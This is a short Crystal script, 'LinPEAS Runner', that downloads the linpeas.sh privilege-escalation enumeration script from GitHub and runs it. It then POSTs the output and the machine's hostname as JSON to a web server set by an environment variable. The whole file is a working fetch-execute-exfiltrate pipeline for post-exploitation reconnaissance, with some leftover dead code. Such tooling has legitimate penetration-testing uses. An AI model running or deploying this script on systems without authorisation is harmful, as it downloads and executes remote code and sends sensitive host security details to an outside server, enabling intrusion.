require "http/client"
require "json"
 
# Configuration
LINPEAS_URL = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
LINPEAS_PATH = "./linpeas.sh"
RESULTS_FILE = "./linpeas_results.txt"
WEB_SERVER_URL = ENV["WEB_SERVER_URL"]? || "http://localhost:8080/upload"


# Download file to a location
def download_from_url(url : String)
  HTTP::Client.get(url) do |response|
    File.write(LINPEAS_PATH, response.body)
    File.chmod(LINPEAS_PATH, 0o755)
    puts "linpeas.sh downloaded successfully"
  end
  true
rescue ex
  puts "Error downloading from URL: #{ex.message}"
  false
end

# Download linpeas and return true if successfull
# Download linpeas and return true if successful
def download_linpeas(url = LINPEAS_URL) : Bool
  puts "Downloading linpeas from #{url}..."
  
  begin
    # Blockless GET: Fetches the response headers immediately
    response = HTTP::Client.get(url)
    
    case response.status_code
    when 301, 302
      location = response.headers["Location"]?
      if location
        # Recursively follow the redirect
        return download_linpeas(location)
      else
        puts "Redirected, but no Location header found."
        return false
      end
      
    when 200
      # Write the actual payload to the file
      File.write(LINPEAS_PATH, response.body)
      File.chmod(LINPEAS_PATH, 0o755)
      puts "linpeas.sh downloaded successfully"
      return true
      
    else
      puts "Failed with status code: #{response.status_code}"
      return false
    end

  rescue ex
    puts "Error downloading linpeas.sh: #{ex.message}"
    return false
  end
end


# Runs linpeas
def run_linpeas
  puts "Running linpeas.sh..."
  
  begin
    # Run linpeas and capture output
    result = `bash #{LINPEAS_PATH} 2>&1`
    
    # Save results to file
    File.write(RESULTS_FILE, result)
    puts "linpeas.sh executed successfully"
    puts "Results saved to #{RESULTS_FILE}"
    
    true
  rescue ex
    puts "Error running linpeas.sh: #{ex.message}"
    false
  end
end

# Sends the RESULT_FILE to the server
def send_to_server
  unless File.exists?(RESULTS_FILE)
    puts "Results file not found: #{RESULTS_FILE}"
    return false
  end
  
  results = File.read(RESULTS_FILE)
  
  puts "Sending results to web server at #{WEB_SERVER_URL}..."
  
  begin
    payload = {
      hostname: `hostname`.strip,
      timestamp: Time.utc.to_s,
      results: results
    }
    
    HTTP::Client.post(
      WEB_SERVER_URL,
      headers: HTTP::Headers{"Content-Type" => "application/json"},
      body: payload.to_json
    ) do |response|
      if response.status_code == 200
        puts "Results sent successfully to #{WEB_SERVER_URL}"
        return true
      else
        puts "Server returned status code: #{response.status_code}"
        puts "Response: #{response.body}"
        return false
      end
    end
  rescue ex
    puts "Error sending to server: #{ex.message}"
    return false
  end
end



def main
  puts "LinPEAS Runner - Crystal Edition"
  puts "=" * 50
  
  unless WEB_SERVER_URL
    puts "WEB_SERVER_URL environment variable not set"
    puts "Usage: WEB_SERVER_URL=http://your-server.com/upload crystal linpeas_runner.cr"
    return
  end
  
  # Step 1: Download linpeas
  unless download_linpeas
    puts "Failed to download linpeas.sh"
    return
  end
  
  # Step 2: Run linpeas
  unless run_linpeas
    puts "Failed to run linpeas.sh"
    return
  end
  
  # Step 3: Send results to server
  unless send_to_server
    puts "Failed to send results to server"
    return
  end
  
  puts "=" * 50
  puts "All tasks completed successfully!"
end
 
main

